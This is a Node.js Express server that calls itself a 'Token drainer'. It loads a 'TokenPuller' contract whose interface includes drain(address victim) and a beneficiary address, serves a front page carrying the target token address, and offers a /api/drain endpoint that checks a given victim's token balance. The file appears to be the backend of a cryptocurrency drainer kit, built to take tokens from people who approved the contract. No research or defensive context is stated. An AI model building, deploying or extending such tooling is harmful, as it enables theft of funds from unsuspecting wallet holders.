const fs = require("fs");
const path = require("path");
const express = require("express");
const { ethers } = require("ethers");
const { Chain } = require("./chain");

const PORT = process.env.PORT || 3999;
const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS || "0x1111111111111111111111111111111111111111";
const RPC_URL = process.env.RPC_URL || "http://127.0.0.1:8545";

const PULLER_ABI = [
  "constructor(address _token, address _beneficiary)",
  "function drain(address victim) external",
  "function token() view returns (address)",
  "function beneficiary() view returns (address)"
];

function loadPullerBytecode() {
  const artifactPath = path.join(__dirname, "artifacts/contracts/TokenPuller.sol/TokenPuller.json");
  if (fs.existsSync(artifactPath)) {
    const artifact = JSON.parse(fs.readFileSync(artifactPath, "utf8"));
    if (artifact.bytecode && artifact.bytecode.length > 10) {
      return artifact.bytecode;
    }
  }
  throw new Error("TokenPuller bytecode not found. Run `npx hardhat compile` first.");
}

const app = express();
app.use(express.json());

// Root route must be registered BEFORE express.static so the
// %TOKEN_ADDRESS% substitution actually runs.
app.get("/", (req, res) => {
  const html = fs.readFileSync(path.join(__dirname, "public/index.html"), "utf8");
  res.send(html.replace(/%TOKEN_ADDRESS%/g, TOKEN_ADDRESS));
});

app.use(express.static(path.join(__dirname, "public")));

const chain = new Chain(RPC_URL);

app.post("/api/drain", async (req, res) => {
  const { victim } = req.body || {};
  if (!victim || !ethers.isAddress(victim)) {
    return res.status(400).json({ error: "'victim' is not a valid address" });
  }
  try {
    const balance = await chain.getBalance(victim, TOKEN_ADDRESS);
    res.json({ victim, token: TOKEN_ADDRESS, balance: balance.toString() });
  } catch (err) {
    res.status(502).json({ error: "chain call failed", detail: err.message });
  }
});

app.get("/api/health", (req, res) => {
  res.json({ ok: true, token: TOKEN_ADDRESS });
});

app.listen(PORT, () => {
  console.log(`Token drainer listening on :${PORT} (token ${TOKEN_ADDRESS.slice(0, 6)}...${TOKEN_ADDRESS.slice(-4)})`);
});
